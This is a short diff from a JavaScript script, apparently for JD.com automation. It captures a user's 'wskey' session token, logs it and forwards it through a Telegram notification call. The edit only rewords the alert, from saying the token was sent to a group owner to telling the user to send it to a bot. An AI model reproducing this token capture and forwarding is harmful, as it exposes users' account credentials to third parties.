@@ -49,7 +49,7 @@ async function set() {
     jd_wskey = old_pin + new_wskey
     $.write(jd_wskey, "jd_wskey")
     console.log(jd_wskey)
-    $.notice("【京东】", "抓取wskey成功，并且成功发送给群主了！！", jd_wskey)
+    $.notice("【京东】", "抓取wskey成功，请自行发给🐱🐱🐱机器人！！", jd_wskey)
     await tgNotify(jd_wskey)
   }
 }
